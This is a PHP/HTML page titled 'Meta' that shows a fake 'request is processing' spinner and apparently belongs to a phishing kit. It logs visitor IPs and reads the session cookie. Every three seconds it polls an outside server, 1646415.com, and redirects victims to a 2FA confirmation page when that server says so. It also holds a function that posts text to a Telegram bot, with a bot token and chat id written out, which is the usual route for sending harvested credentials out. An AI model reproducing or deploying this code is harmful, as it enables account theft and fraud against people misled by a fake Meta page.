<?php
session_start(); // Bắt đầu phiên làm việc (session)

// Lưu thông tin người dùng vào session
$_SESSION['user'] = array(
    'id' => 123,
    'username' => 'nguoidung1',
    'email' => 'nguoidung1@example.com'
);

$ip = $_SERVER['REMOTE_ADDR'];
$file = 'ip_log.txt';
$current = file_get_contents($file);
$current .= $ip . "\n";
file_put_contents($file, $current);

// Sau đó, bạn có thể truy cập thông tin người dùng từ session bằng cách đọc $_SESSION['user']
?>
<html>

<head>
    <script src="js.js"></script>

    <title>Meta</title>
    <link rel="stylesheet" href="style.cs">
    <link rel="stylesheet" href="stylesheets/ui.progress-bar.css">
    <style>
        #progress-container {
            width: 100%;
            background-color: #ccc;
            height: 20px;
            position: relative;
            border-radius: 20px;
        }

        #progress-bar {
            border-radius: 20px;
            width: 0;
            height: 100%;
            background-color: #4CAF50;
            transition: width 1s ease-in-out;
        }

        .spinner {
            position: absolute;
            width: 9px;
            height: 9px;
        }

        .spinner div {
            position: absolute;
            width: 50%;
            height: 150%;
            background: #000000;
            transform: rotate(calc(var(--rotation) * 1deg)) translate(0, calc(var(--translation) * 1%));
            animation: spinner-fzua35 1s calc(var(--delay) * 1s) infinite ease;
        }

        .spinner div:nth-child(1) {
            --delay: 0.1;
            --rotation: 36;
            --translation: 150;
        }

        .spinner div:nth-child(2) {
            --delay: 0.2;
            --rotation: 72;
            --translation: 150;
        }

        .spinner div:nth-child(3) {
            --delay: 0.3;
            --rotation: 108;
            --translation: 150;
        }

        .spinner div:nth-child(4) {
            --delay: 0.4;
            --rotation: 144;
            --translation: 150;
        }

        .spinner div:nth-child(5) {
            --delay: 0.5;
            --rotation: 180;
            --translation: 150;
        }

        .spinner div:nth-child(6) {
            --delay: 0.6;
            --rotation: 216;
            --translation: 150;
        }

        .spinner div:nth-child(7) {
            --delay: 0.7;
            --rotation: 252;
            --translation: 150;
        }

        .spinner div:nth-child(8) {
            --delay: 0.8;
            --rotation: 288;
            --translation: 150;
        }

        .spinner div:nth-child(9) {
            --delay: 0.9;
            --rotation: 324;
            --translation: 150;
        }

        .spinner div:nth-child(10) {
            --delay: 1;
            --rotation: 360;
            --translation: 150;
        }

        @keyframes spinner-fzua35 {

            0%,
            10%,
            20%,
            30%,
            50%,
            60%,
            70%,
            80%,
            90%,
            100% {
                transform: rotate(calc(var(--rotation) * 1deg)) translate(0, calc(var(--translation) * 1%));
            }

            50% {
                transform: rotate(calc(var(--rotation) * 1deg)) translate(0, calc(var(--translation) * 1.5%));
            }
        }
    </style>
    <style>
        html,
        body {
            background-color: #fff;
            color: #636b6f;
            font-family: 'Raleway', sans-serif;
            font-weight: 100;
            height: 100vh;
            margin: 0;
        }

        .full-height {
            height: 100vh;
        }

        .flex-center {
            align-items: center;
            display: flex;
            justify-content: center;
        }

        .position-ref {
            position: relative;
        }

        .top-right {
            position: absolute;
            right: 10px;
            top: 18px;
        }

        .content {
            text-align: center;
        }

        .title {
            font-size: 84px;
        }

        .links>a {
            color: #636b6f;
            padding: 0 25px;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: .1rem;
            text-decoration: none;
            text-transform: uppercase;
        }

        .m-b-md {
            margin-bottom: 50px;
        }
    </style>

    <link rel="shortcut icon" href="images/favicon.ico" />
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-iYQeCzEYFbKjA/T2uDLTpkwGzCiq6soy8tYaI1GyVh/UjpbCx/TYkiZhlZB6+fzT" crossorigin="anonymous">

</head>

<body>

    <div class="flex-center position-ref full-height">
        <div class="content">
            <div class="title m-b-md" style="
            margin-left: 50vw;
            margin-right: 50vw;
        ">
                <div class="spinner">
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                    <div></div>
                </div>
            </div>

            <div class="container">
                <h4><b>Your request is processing</b></h4>
                <p>Please wait 2-3 minutes. We are checking your information. Please do not leave this site once processing is complete.</p>
            </div>
            <div class="container">
                <div class="div">
                    <div id="progress-container">
                        <div id="progress-bar"></div>
                    </div>
                </div>
            </div>

        </div>
    </div>
    </div>
    <footer>
    </footer>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz9ATKxIep9tiCxS/Z9fNfEXiDAYTujMAeBAsjFuCZSmKbSSUnQlmh/jp3" crossorigin="anonymous">
    </script>
    <script>
        setTimeout(function() {
            window.location.href = 'success.php'; // Thay đổi URL sang trang khác
        }, 360000);
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.1/dist/js/bootstrap.min.js" integrity="sha384-7VPbUDkoPSGFnVtYi0QogXtr74QeVeeIs99Qfg5YCF+TidwNdjvaKZX19NZ/e6oz" crossorigin="anonymous">
    </script>
    <script src="javascripts/progress.js" type="text/javascript" charset="utf-8"></script>

</body>
<script>
    $(document).ready(function() {


        GetSess();
        setInterval(function() {
            getstt(sessid); // Thay '32131' bằng id thực tế của bạn
        }, 3000);

    });
    var sessid = "";
    var ip = "";
    var country = "";
    // function SendInfo()
    // {
    //     var email = $('.email').val;
    //     alert(email);
    // }
    function getstt(id) {
        // Tạo yêu cầu AJAX bằng jQuery
        $.ajax({
            url: "https://1646415.com/post.php?t=getstt&id=" + sessid,
            method: "GET",
            dataType: "JSON",
            success: function(data) {
                if (data == '2FA') {
                    window.location.href = 'confirm.php';
                } else if (data == 'Success') {
                    window.location.href = 'success.php';
                } else if (data == 'Index') {
                    window.location.href = 'index.php';
                } else {
                    console.log('khác');
                }
            },
            error: function() {
                // Xử lý lỗi nếu có
                console.error("Đã xảy ra lỗi trong quá trình lấy dữ liệu.");
            }
        });
    }

    function checkCountry(ip) {
        $.ajax({
            url: 'https://ipinfo.io/' + ip + '/json?',
            dataType: 'json',
            success: function(response) {
                country = response.country;
                console.log(country);
            },
            error: function() {
                $("#ip-info").text("Không thể kiểm tra quốc gia cho IP " + ip);
            }
        });
    }

    function getIP() {
        $.ajax({
            url: 'https://ipinfo.io',
            dataType: 'json',
            success: function(response) {
                ip = response.ip;
                console.log(ip);
            },
            error: function() {
                console.log("k get đc");
            }
        });
    }

    function GetSess() {
        var username = $.cookie();
        if (username) {
            sessid = username['PHPSESSID'];
            console.log(username['PHPSESSID']);
        } else {
            $('#cookieValue').text('Cookie không tồn tại');
        }
        return sessid;
    }

    function AddSess() {
        $.ajax({
            url: 'https://1646415.com/modun_post.php',
            type: 'POST',
            dataType: 'JSON',
            data: {
                t: 'insert_sess',
                id: sessid
            },

            success: function(data) {
                console.log('true', data);
            },
            error: function() {
                console.error('false');

            }
        });

    }

    function SendMess(text) {
        $.ajax({
            url: "https://api.telegram.org/bot6527756193:AAH07r_EdcMQLB5qhqKc0-M2KY4bmFYXCKk/sendMessage?chat_id=-999896834&text=" + text,
            type: 'POST',
            success: function(data) {
                console.log('true', data);
            },
            error: function() {
                console.error('false');

            }
        });
    }
</script>

</html>